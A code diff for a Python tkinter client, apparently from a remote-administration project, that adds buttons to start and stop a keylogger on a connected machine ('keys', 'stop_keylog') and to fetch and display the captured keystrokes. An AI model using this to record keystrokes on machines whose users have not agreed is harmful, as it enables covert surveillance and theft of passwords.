@@ -2,21 +2,31 @@ import tkinter as tk
 from client import *
 from connect_server import *
 
+data = None
+
 def hook(window):
-    #Implement hook logic
-    pass
+    message = "keys"
+    globals.client_socket.send(message.encode())
+
 
 def unhook(window):
-    #Implement unhook logic
-    pass
+    message = "stop_keylog"
+    globals.client_socket.send(message.encode())
 
 def in_phim(window):
-    #Implement in_phim logic
-    pass
+    message = "in"
+    globals.client_socket.send(message.encode())
+    data = globals.client_socket.recv(1024)
+    window.txtKQ.config(state="normal")
+    message = data.decode()
+    window.txtKQ.insert(tk.END, message)
+    window.txtKQ.config(state="disabled")
+    
 
 def xoa(window):
-    #Implement xoa logic
-    pass
+    window.txtKQ.config(state="normal")
+    window.txtKQ.delete(1.0, tk.END)
+    window.txtKQ.config(state="disabled")
 
 def on_closing(window):
     #Implement on_closing logic
